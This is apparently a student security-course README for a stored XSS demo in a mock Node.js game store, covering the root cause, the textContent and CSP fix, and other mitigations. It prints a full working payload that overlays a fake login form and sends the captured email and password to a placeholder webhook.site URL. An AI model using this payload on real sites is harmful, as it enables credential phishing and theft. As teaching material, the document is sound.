# Web Server Security: Stored XSS Demonstration

**Course:** Cyber Security (IT-30001) • Module 3: Application Security\
**Instructor:** Dr. Soumyadev Maity\
**Topic:** Cross-Site Scripting (XSS) - Stored Variant\
**Author:** \[Sarthak Sharma\] (Roll No: \[IIT2024043\])

------------------------------------------------------------------------

## Overview

This repository contains a demonstration of **Stored Cross-Site
Scripting (XSS)** (CWE-79) and its corresponding mitigation.

To make the impact of the vulnerability realistic, the application is
designed as a dummy e-commerce platform called **GameStore**, complete
with user authentication, game reviews, and a user profile page
containing saved payment information (simulating account takeover).

The application includes a **"Toggle Fix"** button that instantly
switches the application between the **Vulnerable** state and the
**Secure** state, allowing for a live before-and-after demonstration of
the exploit and the mitigation.

------------------------------------------------------------------------

## How to Run the Application

**Prerequisites:** Node.js installed on your machine. No external `npm`
packages are required.

1.  Clone the repository or extract the project folder.

2.  Open your terminal and navigate to the project directory.

3.  Start the server:

    ``` bash
    node app.js
    ```

4.  Open your browser and navigate to: `http://localhost:3000`.

5.  *Optional:* To start directly in secure mode, run:

    ``` bash
    SAFE=true node app.js
    ```

------------------------------------------------------------------------

## Architecture and File Structure

This project deliberately avoids frameworks (like Express or React) to
keep the data flow completely transparent and easy to explain.

-   **`app.js`**: A plain Node.js HTTP server. It handles static file
    serving, simple API endpoints (game data, comments, login), and
    dynamically injects the Content Security Policy (CSP) header when in
    Safe mode.
-   **`public/`**: Contains the frontend assets (`index.html`,
    `game.html`, `profile.html`, `login.html`), CSS, and client-side
    JavaScript.
-   **`data.json`**: A simple JSON file acting as the database, storing
    user reviews.

### The Dummy Victim Account

To demonstrate the impact of account takeover, use these credentials on
the login page:

-   **Email:** `john.doe@example.com`
-   **Password:** `password123`

------------------------------------------------------------------------

## The Vulnerability (Stored XSS)

-   **Vulnerability Class:** CWE-79 (Improper Neutralization of Input
    During Web Page Generation)
-   **Variant:** Stored (Persistent) XSS

### Root Cause

The vulnerability exists in the `game.js` file. When a user submits a
game review, it is saved directly to the `data.json` database. When the
page renders, it fetches these comments and outputs them using the
`innerHTML` property:

``` javascript
// Vulnerable code in public/game.js
if (VULNERABLE) {
    body.innerHTML = c.text; // Renders the input as raw HTML/JS
}
```

Because the browser cannot distinguish between the developer's code and
the attacker's input, it parses and executes the input as valid HTML.

*Note: Modern browsers block `<script>` tags inserted via `innerHTML`,
which is why the demonstration payload uses an `<img>` tag with an
`onerror` event handler, a standard XSS technique.*

### The Payload (Redress Attack / Phishing Overlay)

The payload used in this demonstration simulates a **Fake Login Overlay
(Redress Attack)**. When the victim views the infected game page, it
injects a fake login modal that mimics the site's UI. In a real attack,
submitted credentials could be sent to an attacker-controlled endpoint.
Use only a controlled test environment and a webhook endpoint you own.

The following is the demonstration payload as supplied:

``` html
<img src="x" onerror="(function(){const overlay=document.createElement('div');overlay.style='position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.85);backdrop-filter:blur(5px);z-index:99999;display:flex;align-items:center;justify-content:center;';overlay.innerHTML='<div style=\'background:#1c1c1c;padding:40px;border-radius:10px;border:1px solid #333;text-align:center;width:350px;box-shadow:0 10px 30px rgba(0,0,0,0.5);font-family:system-ui,sans-serif;\'><h2 style=\'color:#eee;margin-top:0;\'>GameStore</h2><p style=\'color:#aaa;font-size:14px;margin-bottom:20px;\'>Your session has expired.<br>Please log in again to view your cart.</p><input type=\'email\' id=\'steal-user\' placeholder=\'Email address\' style=\'width:100%;padding:12px;margin:0 0 10px 0;border-radius:4px;border:none;background:#333;color:white;box-sizing:border-box;\'><input type=\'password\' id=\'steal-pass\' placeholder=\'Password\' style=\'width:100%;padding:12px;margin:0 0 15px 0;border-radius:4px;border:none;background:#333;color:white;box-sizing:border-box;\'><button id=\'steal-btn\' style=\'width:100%;padding:12px;background:#6cf;color:#000;border:none;border-radius:4px;font-weight:bold;cursor:pointer;\'>Sign In</button></div>';document.body.appendChild(overlay);document.getElementById('steal-btn').onclick=function(e){e.preventDefault();const user=document.getElementById('steal-user').value;const pass=document.getElementById('steal-pass').value;const img=new Image();img.src='https://webhook.site/your_webhook_id?email='+encodeURIComponent(user)+'&password='+encodeURIComponent(pass);window.location.href='/index.html';};})();">
```

**Execution Flow:**

1.  Attacker posts the payload as a comment on a game page.
2.  Victim visits the page. The `innerHTML` sink parses the `<img>` tag.
    The fake image fails to load, triggering the `onerror` JavaScript.
3.  The JavaScript builds a fake login overlay (using
    `document.createElement`) and injects it into the DOM.
4.  If the victim enters credentials, the script sends a `GET` request
    to an external webhook (simulating the attacker's server).
5.  The script redirects the victim to the real `index.html` page to
    avoid raising suspicion.

------------------------------------------------------------------------

## The Mitigation (Implemented Fix)

Clicking the **"Toggle Fix"** button switches the application to Secure
Mode, which implements two layers of defense.

### Layer 1: Context-Aware Output Encoding (Primary Fix)

In `public/game.js`, the vulnerable `innerHTML` is replaced with
`textContent`:

``` javascript
// Secure code: Treat the input strictly as plain text
} else {
    body.textContent = c.text;
}
```

**Why it works:** `textContent` instructs the browser to treat the input
as literal text. Characters such as `<` and `>` are displayed as text
rather than interpreted as HTML, preventing the payload from executing.

### Layer 2: Content Security Policy (Defense-in-Depth)

In `app.js`, the server injects a CSP header into the HTTP response when
in Safe Mode:

``` javascript
headers["Content-Security-Policy"] = "default-src 'self'; script-src 'self'; ...";
```

**Why it works:** Even if an attacker finds another unescaped sink (or a
developer makes a mistake), the CSP header tells the browser to block
inline scripts and unauthorized external domains. It acts as a safety
net.

------------------------------------------------------------------------

## Other Mitigation Theory (Not Implemented)

While this demo implements output encoding and CSP, other theoretical
mitigations from the lecture slides include:

1.  **HTML Sanitization:** If the application requires allowing *some*
    HTML (e.g., bold text or images in reviews), a vetted library like
    **DOMPurify** should be used. It parses the HTML, strips out
    dangerous tags and attributes, and returns a safe result. Home-made
    blacklist filters are easily bypassed.
2.  **HttpOnly Cookies:** Setting the `HttpOnly` flag on session cookies
    prevents JavaScript from reading `document.cookie`. While this helps
    prevent session-cookie theft, it **does not** stop the fake login
    overlay demonstrated in this project.
3.  **Safe DOM Sinks:** Avoiding `innerHTML`, `document.write`, and
    `eval()`. Using `textContent` (as done in this fix) is the primary
    example of a safe DOM sink.
